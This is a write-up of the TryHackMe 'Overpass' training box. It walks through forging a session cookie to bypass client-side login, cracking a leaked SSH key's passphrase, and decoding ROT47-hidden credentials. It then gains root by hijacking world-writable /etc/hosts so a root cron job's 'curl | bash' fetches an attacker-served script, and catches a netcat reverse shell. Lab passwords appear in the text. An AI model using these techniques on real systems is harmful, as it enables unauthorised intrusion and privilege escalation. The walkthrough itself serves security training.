# TryHackMe: Overpass

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red) ![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%2FIntermediate-yellow) ![Category](https://img.shields.io/badge/Category-Web-blue) ![Format](https://img.shields.io/badge/Format-Full%20Box-orange) ![Status](https://img.shields.io/badge/Status-Completed-success)

![Room banner](screenshots/00_room_banner.png)

## Room Info

| Field | Value |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Overpass](https://tryhackme.com/room/overpass) |
| **Difficulty** | Beginner/Intermediate |
| **Estimated Time** | 45 min |
| **Category** | Web (broken authentication) → SSH key cracking → Linux privilege escalation (cron + hosts hijack) |
| **Tools Used** | `nmap`, `gobuster`, browser dev tools, `ssh2john`, `john`, CyberChef, `nc`, `python3 -m http.server` |
| **Objective** | Get `user.txt` and `root.txt` |

---

## Concept Glossary

- **Broken Authentication (OWASP Top 10)** — a class of vulnerability where the *client* is trusted to decide whether a login succeeded, instead of the server enforcing that decision. If the client-side code sets a "logged in" state based on loosely-checked conditions (e.g. "if the response isn't literally the string `'Incorrect credentials'`, treat it as success"), an attacker doesn't need real credentials — they just need to make the client believe the check passed.
- **Session cookies as trust tokens** — many apps store a `SessionToken` cookie after login and treat its mere *presence* as proof of authentication, rather than validating it server-side on every request. If the server never actually verifies the token's value, an attacker can set the cookie to anything (even an empty string) and be treated as authenticated.
- **`ssh2john` + John the Ripper** — an encrypted SSH private key (`-----BEGIN RSA PRIVATE KEY-----` with a `Proc-Type: 4,ENCRYPTED` header) is protected by a passphrase, not directly crackable like a password hash. `ssh2john.py` converts the key into a hash format John the Ripper understands, so a wordlist attack can recover the passphrase needed to actually *use* the key.
- **ROT47** — a Caesar-style substitution cipher, like ROT13 but extended to cover the full range of printable ASCII (33–126) instead of just letters, so it also scrambles digits and punctuation. It's trivially reversible (running it again undoes it) and offers no real security — it's obfuscation, not encryption, and is a common way CTF authors hide short secrets in plain sight.
- **`/etc/hosts` hijacking of a scheduled job** — `/etc/hosts` maps hostnames to IPs *before* DNS is ever consulted. If a privileged scheduled task (a root cron job here) fetches a resource by hostname rather than a hardcoded IP, and the hosts file is writable by a lower-privileged user, that user can redirect the hostname to their own machine. The privileged process then unknowingly downloads and executes whatever the attacker serves — turning a "harmless" world-writable config file into a full privilege escalation primitive.
- **`curl <url> | bash` in a cron job** — piping a remote script straight into a shell, on a schedule, as root, is inherently dangerous: there's no integrity check (no checksum, no signature) between "what the URL is supposed to serve" and "what actually gets executed." Whoever controls the resolution of that URL controls root.

---

## 1. Reconnaissance — Port Scan

```bash
nmap -sV -O 10.129.177.146
```

![Nmap scan results](screenshots/01_nmap_scan.png)

**Results — 2 open ports:**

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80 | HTTP | Golang `net/http` server |

**Why this matters:** a Go-based web server on port 80 plus SSH means the entry point is almost certainly the web app itself — either a vulnerability in its custom logic, or a set of credentials/keys exposed somewhere in it that unlock SSH.

---

## 2. Web Recon — The Overpass "Password Manager"

Browsed to the site directly:

![Overpass landing page](screenshots/02_website_landing_page.png)

The site markets itself as **Overpass**, a password manager built by a group of Computer Science students, claiming passwords are "never transmitted over the internet" and protected by "Military Grade" encryption — language that (correctly) reads as a red flag for a CTF box rather than a real security claim.

Ran directory enumeration to map out the app's structure:

```bash
gobuster dir -u http://10.129.177.146/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,js \
  -t 30 \
  -o gobuster.txt
```

![gobuster directory enumeration](screenshots/03_gobuster_dir_enum.png)

**Notable finds:**
- `/admin.html` and `/admin/` — an administrator area
- `/login.js` — the client-side logic handling the login form
- `/downloads/` — a downloads directory (turns out to matter a lot later)
- `/cookie.js`, `/main.js` — supporting scripts

---

## 3. Bypassing Authentication — Client-Trusted Session Logic

Visited `/admin.html` and found a standard username/password login form:

![Admin login page](screenshots/04_admin_login_page.png)

Rather than trying to brute-force it, viewed the source of `/login.js` to understand exactly how login is validated:

```
view-source:http://10.129.177.146/login.js
```

![login.js source code](screenshots/05_login_js_source.png)

**The relevant logic:**

```javascript
const response = await postData("/api/login", creds);
const statusOrCookie = await response.text();
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials";
    passwordBox.value = "";
} else {
    Cookies.set("SessionToken", statusOrCookie);
    window.location = "/admin";
}
```

**Why this is exploitable:** the client only checks for one specific failure string. *Any* other response — including a malformed request, an error, or literally nothing meaningful — falls into the `else` branch, which blindly sets a `SessionToken` cookie and redirects to `/admin`. The server-side `/admin` page apparently never actually validates that token's contents either; it just checks that the cookie *exists*. This is textbook **Broken Authentication**: the check that matters is enforced entirely on the client, in code the attacker can read and route around.

![Annotated analysis of the vulnerability](screenshots/06_broken_auth_analysis.png)

Confirmed the bypass by opening the browser console on the login page and manually setting the cookie to an arbitrary value, then navigating straight to `/admin`:

```javascript
Cookies.set("SessionToken", "")
```

No credentials guessed, no brute-forcing — just walking straight past a check that was never actually enforced server-side.

---

## 4. Admin Area — Leaked SSH Private Key

Navigating to `/admin/` with the forged cookie granted full access:

![Admin area revealing an RSA private key](screenshots/07_admin_area_rsa_key.png)

The page contains a message from a developer, "Paradox," to a user named **James**, along with a full **encrypted RSA private key**:

> "Since you keep forgetting your password, James, I've set up SSH keys for you. If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you. Also, we really need to talk about this 'Military Grade' encryption. - Paradox"

**Why:** this both names a valid system user (`james`) and hands over a private key protected by a passphrase — the next problem to solve is recovering that passphrase.

---

## 5. Cracking the SSH Key Passphrase

Saved the key locally as `id_rsa`, converted it into a crackable hash, and ran it against `rockyou.txt`:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

Then used the recovered passphrase to SSH in as `james`:

```bash
ssh -i id_rsa james@10.129.177.146
```

![ssh2john crack and successful SSH login](screenshots/08_ssh2john_crack_login.png)

**Result:** the passphrase cracked to `james13`, and the SSH session dropped straight into a shell as `james` on `ip-10-129-177-146` (Ubuntu 20.04.6 LTS).

---

## 6. User Flag and Initial Home Directory Enumeration

```bash
ls -la
cat user.txt
```

![Home directory listing and user.txt attempt](screenshots/09_home_dir_user_txt.png)

Home directory contents included `todo.txt`, `user.txt`, and a hidden `.overpass` file.

**user flag:** Not captured — the `cat user.txt` command was issued but the flag value was cut off before it rendered in the screenshot.

---

## 7. Finding the Privilege Escalation Vector — Root's Cron Job

```bash
cat todo.txt
cat /etc/crontab
```

![todo.txt hint and vulnerable crontab entry](screenshots/10_todo_and_crontab.png)

`todo.txt` includes a note from James about "Paradox" and an automated build script:

> "Ask Paradox how he got the automated build script working and where the builds go. They're not updating on the website"

And `/etc/crontab` reveals exactly that build process, running as **root**, every minute:

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

**Why this is the privilege escalation vector:** this is a root-owned cron job that fetches a script by **hostname** (`overpass.thm`, not a hardcoded IP) and pipes it straight into `bash` with zero integrity checking, once every minute. Anyone who can control what `overpass.thm` resolves to on this machine controls what root executes next.

---

## 8. Decoding the `.overpass` File

Back in James' home directory, a hidden `.overpass` file contained an unreadable, encoded string:

```bash
cat .overpass
```

![cat .overpass showing encoded string](screenshots/12_overpass_file_encoded.png)

Recognized the character pattern as likely ROT47 and decoded it in CyberChef using the `ROT47` operation:

![CyberChef ROT47 recipe applied to the string](screenshots/11_cyberchef_rot47.png)

Decoding it revealed a JSON blob:

```json
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

**Why:** this is a set of leftover/internal credentials embedded in the app's data — its exact intended use inside Overpass wasn't pursued further, since the `/etc/hosts` + cron path (below) was the confirmed route to root, but it's a good example of secrets hiding in plain-sight "encoding" rather than real encryption, consistent with the room's whole "Military Grade encryption" joke.

---

## 9. Weaponizing the Cron Job — `/etc/hosts` Hijack

Checked the permissions and current content of `/etc/hosts`:

```bash
ls -l /etc/hosts
cat /etc/hosts
```

![/etc/hosts permissions and original content](screenshots/13_etc_hosts_original.png)

**Critical finding:** `/etc/hosts` is `-rw-rw-rw-` — world **writable** — and currently maps `overpass.thm` to `127.0.0.1` (i.e. the box resolves its own hostname to itself).

Since the root cron job resolves `overpass.thm` through this exact file before making its `curl` request, overwriting this single line redirects that request to any machine of the attacker's choosing:

```bash
vim /etc/hosts
# change: 127.0.0.1 overpass.thm  →  <attacker_ip> overpass.thm
```

![Confirming the edited /etc/hosts now points overpass.thm at the attacker IP](screenshots/14_etc_hosts_edited_view.png)

Drafted an initial low-risk proof-of-concept payload to confirm the redirect actually gets executed by root before committing to a full reverse shell, and re-confirmed the hosts file edit had taken effect:

```bash
echo 'cat /root/root.txt > /home/james/stuff.txt' > downloads/src/buildscript.sh
cat downloads/src/buildscript.sh
grep overpass.thm /etc/hosts
```

![vim edit, draft payload, and confirmation of the hosts redirect](screenshots/15_hosts_edit_and_payload_draft.png)

`grep overpass.thm /etc/hosts` confirmed the entry now reads `192.168.164.247 overpass.thm` — pointing squarely at the attack box.

---

## 10. Serving the Malicious `buildscript.sh`

With `overpass.thm` now resolving to the attack box, hosted a matching directory structure (`downloads/src/buildscript.sh`) via a local HTTP server so the next `curl overpass.thm/downloads/src/buildscript.sh` from the target's root cron would fetch it instead:

```bash
sudo python3 -m http.server 80
```

![Python HTTP server log showing the target's cron hitting buildscript.sh every 60 seconds](screenshots/16_http_server_log_cron_hits.png)

The access log confirms the exploit chain is live — the target (`10.129.177.146`) requests `/downloads/src/buildscript.sh` once every 60 seconds, exactly matching the `* * * * *` cron schedule, and receives a `200 OK` each time.

**Why:** this is the proof that root's scheduled task is now executing whatever content is placed in that file, on a reliable one-minute cadence — turning the file's content into a root-level RCE primitive.

---

## 11. Catching the Root Shell

Swapped the served `buildscript.sh` for a full Bash reverse shell one-liner and started a listener:

```bash
nc -lvnp 4444
```

![Root reverse shell caught, whoami confirms root](screenshots/17_root_reverse_shell.png)

Within the next cron cycle, the listener caught a connection:

```
connect to [192.168.164.247] from (UNKNOWN) [10.129.177.146] 48386
root@ip-10-129-177-146:~# whoami
root
```

`whoami` returned `root` — the `/etc/hosts` redirect plus the unauthenticated cron download chain gave full root access.

---

## Full Lessons Learned

1. **Client-side "authentication" is not authentication.** The entire admin login bypass here came down to reading `login.js` and noticing the pass/fail decision was made in the browser, not the server. Any time a login flow can be fully understood by reading unminified client JavaScript, that's a strong signal the real check might be missing or misplaced — server-side session validation has to happen on *every* protected request, not just be inferred from a cookie's mere presence.
2. **A leaked private key is only half a credential.** Finding the RSA key in the admin panel didn't grant access by itself — the encryption passphrase still had to be cracked. This is a good reminder that "encrypted" artifacts found during recon are often crackable with a standard wordlist, and `ssh2john` + John the Ripper is the standard toolchain for that specific artifact type.
3. **World-writable config files are a privilege escalation goldmine, not a curiosity.** `/etc/hosts` being `rw-rw-rw-` looks minor in isolation — it's just a hostname mapping. It only became critical once correlated with the *separate* discovery that a root cron job resolves a hostname (not an IP) to fetch and blindly execute a remote script. Neither fact alone was the vulnerability; the combination was.
4. **`curl | bash` as root, on a schedule, from a hostname is close to the worst version of this pattern.** No hash pinning, no signature check, and a hostname resolution step that a low-privileged local user can influence. The lesson generalizes: any privileged process that trusts DNS/hosts resolution for something it's about to execute is only as trustworthy as whoever controls that resolution.
5. **"Encoded" is not "encrypted."** The `.overpass` file's ROT47 string is a good hands-on example of the difference — trivially reversible obfuscation dressed up as a secret, which lines up with the room's running joke about Overpass's fake "Military Grade" security claims.
6. **Proof-of-concept before payload.** Testing the cron hijack first with a harmless read (`cat /root/root.txt > /home/james/stuff.txt`) before committing to a reverse shell is good methodology — it confirms the injection point actually fires as expected on a predictable schedule before spending time crafting and troubleshooting a more complex payload.

---

## Skills Demonstrated

`Nmap enumeration` · `Web directory brute-forcing (gobuster)` · `Client-side JavaScript source review` · `Broken Authentication exploitation (OWASP Top 10)` · `SSH private key passphrase cracking (ssh2john + John the Ripper)` · `ROT47 decoding (CyberChef)` · `Cron job analysis` · `/etc/hosts hijacking for privileged-process redirection` · `Malicious payload hosting (python3 http.server)` · `Reverse shell crafting and handling` · `Linux privilege escalation methodology`

---

## References

- [TryHackMe — Overpass room](https://tryhackme.com/room/overpass)
- [John the Ripper — ssh2john](https://github.com/openwall/john)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [OWASP Top 10 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
